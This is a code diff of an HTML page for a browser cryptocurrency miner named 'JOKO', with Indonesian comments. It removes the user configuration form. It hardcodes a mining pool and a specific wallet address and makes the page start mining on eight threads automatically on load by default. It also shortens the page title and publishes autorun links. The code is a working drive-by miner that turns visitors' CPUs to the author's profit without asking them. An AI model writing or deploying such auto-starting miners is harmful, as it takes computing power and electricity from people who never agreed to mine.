@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>JOKO Web Miner</title>
+  <title>JOKO</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
 
-  <!-- Import map agar index.js bisa import "socket.io-client" -->
+  <!-- Module alias agar import "socket.io-client" di index.js bisa resolve -->
   <script type="importmap">
   {
     "imports": {
@@ -15,296 +15,130 @@
   </script>
 
   <style>
-    :root{ color-scheme:dark }
-    html,body{height:100%}
-    body{
-      margin:0; background:#0b0f14; color:#e7eef8;
-      font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
+    /* Dark style sederhana */
+    :root { color-scheme: dark; }
+    html, body { height: 100%; }
+    body {
+      margin: 0;
+      background: #0b0f14;
+      color: #e7eef8;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
     }
-    .wrap{ max-width:860px; margin:28px auto; padding:0 16px; }
-    h1{ font-size:20px; margin:0 0 4px; }
-    .sub{ color:#9db0c9; font-size:13px; margin-bottom:16px; }
-    .card{
-      background:#0f1520; border:1px solid #1a283f; border-radius:12px;
-      box-shadow:0 10px 24px rgba(0,0,0,.35); overflow:hidden;
+    .wrap { max-width: 900px; margin: 32px auto; padding: 0 16px; }
+    h1 { font-size: 20px; margin: 0 0 8px; }
+    .muted { color: #9db0c9; font-size: 13px; margin-bottom: 16px; }
+    .actions { margin: 16px 0; }
+    button {
+      appearance: none; border: 1px solid #274b86; background: #173053;
+      color: #cfe7ff; padding: 10px 14px; border-radius: 8px; cursor: pointer;
     }
-    .card .head{
-      padding:12px 14px; border-bottom:1px solid #1a283f; display:flex; justify-content:space-between; align-items:center;
-      background:linear-gradient(180deg,rgba(255,255,255,.03),transparent);
+    button:disabled { opacity: .6; cursor: not-allowed; }
+    .log {
+      margin-top: 16px; background: #0a0f18; border: 1px solid #1a283f;
+      border-radius: 8px; padding: 12px; height: 220px; overflow: auto;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 12px;
+      white-space: pre-wrap;
     }
-    .card .body{ padding:16px; }
-    .title{ font-size:13px; letter-spacing:.3px; color:#9db0c9; text-transform:uppercase }
-    .grid{ display:grid; gap:12px }
-    @media(min-width:700px){ .grid{ grid-template-columns: repeat(3,1fr) } .grid.full{ grid-template-columns: 1fr 1fr 1fr } }
-    label{ display:block; margin:0 0 6px; color:#aab9d6; font-size:13px }
-    input, select{
-      width:100%; padding:10px 12px; border-radius:10px; outline:none;
-      background:#111926; border:1px solid #1d2a3f; color:#e7eef8;
+    .links {
+      margin-top: 16px; font-size: 13px; color: #9db0c9;
     }
-    input::placeholder{ color:#7f92ad }
-    .row{ display:grid; gap:12px }
-    @media(min-width:700px){ .row.cols-2{ grid-template-columns:1fr 1fr } }
-    .actions{ display:flex; gap:10px; flex-wrap:wrap; margin-top:6px }
-    .btn{
-      appearance:none; border:0; cursor:pointer; padding:10px 14px; border-radius:10px;
-      background:#1f62ff; color:#fff; font-weight:700; border:1px solid #1b55db;
-    }
-    .btn.secondary{ background:#1b2233; border-color:#24334c; color:#d7e6ff }
-    .btn:disabled{ opacity:.6; cursor:not-allowed }
-    .log{
-      margin-top:14px; background:#0a0f18; border:1px solid #1a283f; border-radius:10px;
-      height:220px; overflow:auto; padding:12px; font-size:12px;
-      font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; white-space:pre-wrap;
-    }
-    .autorun{ margin-top:10px; font-size:13px; color:#9db0c9 }
-    .error{ color:#ffb3b3 }
-    code{ background:#101a2a; border:1px solid #1a283f; padding:1px 6px; border-radius:6px }
+    code { background: #0f1520; padding: 2px 6px; border-radius: 6px; border: 1px solid #1a283f; }
   </style>
 </head>
 <body>
   <div class="wrap">
-    <h1>JOKO Web Miner</h1>
-    <div class="sub">Manual config + AutoRun link </div>
+    <h1>JOKO Miner</h1>
+    <div class="muted">JOKO</div>
 
-    <div class="card">
-      <div class="head">
-        <div class="title">Configuration</div>
-        <div id="status" class="title">Idle</div>
-      </div>
-      <div class="body">
-        <div class="row cols-2">
-          <div>
-            <label for="algo">Algorithm</label>
-            <select id="algo"></select>
-          </div>
-          <div>
-            <label for="threads">Threads</label>
-            <input id="threads" type="number" min="0" placeholder="0 = All hardware threads" value="4" />
-          </div>
-        </div>
+    <div class="actions">
+      <!-- Tombol Start hanya dipakai saat manual mode -->
+      <button id="startBtn" style="display:none;">Start</button>
+    </div>
 
-        <div class="grid full" style="margin-top:10px">
-          <div>
-            <label for="host">Host Pool</label>
-            <input id="host" placeholder="e.g. asia.rplant.xyz" value="asia.rplant.xyz" />
-          </div>
-          <div>
-            <label for="port">Port</label>
-            <input id="port" type="number" placeholder="7022" value="7022" />
-          </div>
-          <div>
-            <label for="password">Password</label>
-            <input id="password" placeholder="x" value="x" />
-          </div>
-        </div>
+    <div id="log" class="log" aria-live="polite"></div>
 
-        <div class="row" style="margin-top:10px">
-          <div>
-            <label for="wallet">Wallet</label>
-            <input id="wallet" placeholder="your_wallet_or_worker" />
-          </div>
-        </div>
-
-        <div class="actions">
-          <button id="saveBtn" class="btn secondary">Save Config</button>
-          <button id="startBtn" class="btn">Start Mining</button>
-        </div>
-
-        <div id="msg" class="error" style="margin-top:8px"></div>
-
-        <div class="autorun">
-          AutoRun Link (uses your current config):<br />
-          <a id="autorunLink" href="#" target="_blank" rel="noopener">Fill form to generate link…</a>
-        </div>
-
-        <div id="log" class="log" aria-live="polite"></div>
-      </div>
+    <div class="links">
+      Auto Run Link: <a href="https://weeb.jokooo.site/?autorun=true" target="_blank" rel="noopener">https://weeb.jokooo.site/?autorun=true</a><br />
+      Manual Start Link: <a href="https://weeb.jokooo.site/?manual=true" target="_blank" rel="noopener">https://weeb.jokooo.site/?manual=true</a>
     </div>
   </div>
 
   <!-- App -->
   <script type="module">
-    import * as miner from './index.js';
+    import * as joko from './index.js';
 
-    const els = {
-      algo: document.getElementById('algo'),
-      host: document.getElementById('host'),
-      port: document.getElementById('port'),
-      password: document.getElementById('password'),
-      threads: document.getElementById('threads'),
-      wallet: document.getElementById('wallet'),
-      saveBtn: document.getElementById('saveBtn'),
-      startBtn: document.getElementById('startBtn'),
-      autorunLink: document.getElementById('autorunLink'),
-      status: document.getElementById('status'),
-      msg: document.getElementById('msg'),
-      log: document.getElementById('log'),
-    };
+    const logEl = document.getElementById('log');
+    const startBtn = document.getElementById('startBtn');
 
-    const LS_KEY = 'joko-webminer-config-v2';
-
-    function log(line){
+    function log(line) {
       const ts = new Date().toLocaleTimeString();
-      els.log.textContent += `[${ts}] ${line}\n`;
-      els.log.scrollTop = els.log.scrollHeight;
+      logEl.textContent += `[${ts}] ${line}\n`;
+      logEl.scrollTop = logEl.scrollHeight;
+      // tetap kirim ke console juga
       console.log(line);
     }
-    function setStatus(text){ els.status.textContent = text; }
-    function setError(text){ els.msg.textContent = text || ''; }
 
-    // Populate algorithms from index.js (values that start with "cwm_")
-    function populateAlgos(){
-      const entries = Object.entries(miner)
-        .filter(([k,v]) => typeof v === 'string' && v.startsWith('cwm_'))
-        .sort((a,b)=> a[0].localeCompare(b[0]));
-      for (const [name, value] of entries){
-        const opt = document.createElement('option');
-        opt.value = value;
-        opt.textContent = name;
-        els.algo.appendChild(opt);
-      }
-      // default prefer power2B if present
-      const prefer = entries.find(([k])=>/power2b/i.test(k));
-      if (prefer) els.algo.value = prefer[1];
-    }
+    // --- Konfigurasi hardcode (tetap sama seperti file kamu)
+    const stratum = {
+      server: "asia.rplant.xyz",
+      port: 7022,
+      worker: "mbc1qpwn9kvuudk6qxujfqvz58ezhxdjs20gjfl5ndl",
+      password: "x",
+      ssl: false
+    };
 
-    function getConfig(){
-      return {
-        algo: els.algo.value,
-        host: els.host.value.trim(),
-        port: parseInt(els.port.value || '0', 10),
-        password: els.password.value.trim() || 'x',
-        threads: Math.max(0, parseInt(els.threads.value || '0', 10)),
-        wallet: els.wallet.value.trim()
-      };
-    }
+    let started = false;
+    function startMining() {
+      if (started) return;
+      started = true;
 
-    function validate(cfg){
-      if (!cfg.algo) throw new Error('Algorithm is required');
-      if (!cfg.host) throw new Error('Host is required');
-      if (!cfg.port || cfg.port <= 0) throw new Error('Valid port is required');
-      if (!cfg.wallet) throw new Error('Wallet wajib diisi!');
-    }
-
-    function saveConfig(){
-      const cfg = getConfig();
-      try{
-        validate(cfg);
-        localStorage.setItem(LS_KEY, JSON.stringify(cfg));
-        setError('');
-        log('✅ Config saved.');
-      }catch(e){
-        setError(e.message || e);
-      }
-      updateAutorunLink(); // update link regardless (will include wallet if filled)
-    }
-
-    function loadConfig(){
-      const raw = localStorage.getItem(LS_KEY);
-      if (!raw) return;
-      try{
-        const cfg = JSON.parse(raw);
-        if (cfg.algo) els.algo.value = cfg.algo;
-        if (cfg.host) els.host.value = cfg.host;
-        if (cfg.port) els.port.value = String(cfg.port);
-        if (cfg.password) els.password.value = cfg.password;
-        if (typeof cfg.threads === 'number') els.threads.value = String(cfg.threads);
-        if (cfg.wallet) els.wallet.value = cfg.wallet;
-      }catch{}
-    }
-
-    function updateAutorunLink(){
-      const cfg = getConfig();
-      // Build autorun URL using current form (not only saved config)
-      const base = 'https://weeb.jokooo.site/';
-      const url = new URL(base);
-      url.searchParams.set('autorun','true');
-      if (cfg.algo)   url.searchParams.set('algo', cfg.algo);
-      if (cfg.host)   url.searchParams.set('host', cfg.host);
-      if (cfg.port)   url.searchParams.set('port', String(cfg.port));
-      if (cfg.password) url.searchParams.set('pass', cfg.password);
-      if (!Number.isNaN(cfg.threads)) url.searchParams.set('threads', String(cfg.threads));
-      if (cfg.wallet) url.searchParams.set('wallet', cfg.wallet);
-
-      els.autorunLink.href = url.toString();
-      els.autorunLink.textContent = url.toString();
-    }
-
-    function startMining(){
-      const cfg = getConfig();
-      try{
-        validate(cfg);
-      }catch(e){
-        setError(e.message || e);
-        log('❌ ' + (e.message || e));
-        return;
-      }
-      setError('');
-      setStatus('Running');
-      log(`Starting miner • algo=${cfg.algo} • threads=${cfg.threads}`);
-
-      // Build stratum from form
-      const stratum = {
-        server: cfg.host,
-        port: cfg.port,
-        worker: cfg.wallet,     // wallet/worker required
-        password: cfg.password,
-        ssl: false
-      };
-
-      try{
-        const usedThreads = miner.start(
-          cfg.algo,
-          stratum,
-          null,
-          cfg.threads || miner.ALL_THREADS,
-          (work)=>{ log('New work received'); },
-          (hr)=>{ log(`Hashrate: ${(hr?.hashrateKHs ?? 0)} KH/s`); },
-          (err)=>{ log('Error: ' + (err?.error || err)); }
+      log(`Starting miner... algo=power2B, threads=8`);
+      try {
+        joko.start(
+          joko.power2B,          // algoritma
+          stratum,               // stratum config
+          null,                  // log (unused)
+          8,                     // threads
+          work => {
+            // tampilkan info job
+            const jobId = work?.work?.job_id || 'new work';
+            log(`New work received (${jobId})`);
+          },
+          hashrate => {
+            // tampilkan hashrate KH/s
+            const hr = hashrate?.hashrateKHs ?? 0;
+            log(`Hashrate: ${hr} KH/s`);
+          },
+          error => {
+            log(`Error: ${error?.error || error}`);
+          }
         );
-        log(`Threads active: ${usedThreads}`);
-      }catch(e){
-        setStatus('Error');
-        log('Start failed: ' + (e?.message || e));
+        log(`Miner started.`);
+      } catch (e) {
+        log(`Start failed: ${e?.message || e}`);
       }
     }
 
-    // Wire events
-    els.saveBtn.addEventListener('click', saveConfig);
-    els.startBtn.addEventListener('click', startMining);
-    [els.algo,els.host,els.port,els.password,els.threads,els.wallet].forEach(el=>{
-      el.addEventListener('input', updateAutorunLink);
-    });
-
-    // Init
-    populateAlgos();
-    loadConfig();
-    updateAutorunLink();
-
-    // URL flags
+    // --- URL flags
     const params = new URLSearchParams(location.search);
-    const isAutorun = params.get('autorun') === 'true';
+    const isManual = params.get('manual') === 'true';
+    const isAutoRun = params.get('autorun') === 'true';
 
-    // If autorun=true, try to start using current (or saved) config
-    if (isAutorun) {
-      // If query also provides fields, pre-fill form so user sees what's used
-      const qp = (k)=>params.get(k);
-      if (qp('algo')) els.algo.value = qp('algo');
-      if (qp('host')) els.host.value = qp('host');
-      if (qp('port')) els.port.value = qp('port');
-      if (qp('pass')) els.password.value = qp('pass');
-      if (qp('threads')) els.threads.value = qp('threads');
-      if (qp('wallet')) els.wallet.value = qp('wallet');
-      updateAutorunLink();
-
-      // Only start if wallet present (wallet is required)
-      if (els.wallet.value.trim()) {
-        log('Autorun mode: starting…');
-        setTimeout(startMining, 250);
-      } else {
-        setError('Wallet wajib diisi! (autorun dibatalkan)');
-        log('❌ Autorun cancelled: wallet is empty.');
-      }
+    // Default: auto start, kecuali manual=true
+    // autorun=true selalu paksa auto start
+    if (isManual && !isAutoRun) {
+      // Manual mode: tampilkan tombol Start
+      startBtn.style.display = 'inline-block';
+      startBtn.addEventListener('click', () => {
+        startBtn.disabled = true;
+        startMining();
+      });
+      log('Manual mode: click "Start" to begin.');
+    } else {
+      // Auto start (default atau autorun=true)
+      log(isAutoRun ? 'Autorun mode via URL: starting...' : 'Auto start: starting...');
+      // sedikit delay supaya log tampil dulu
+      setTimeout(startMining, 200);
     }
   </script>
 </body>
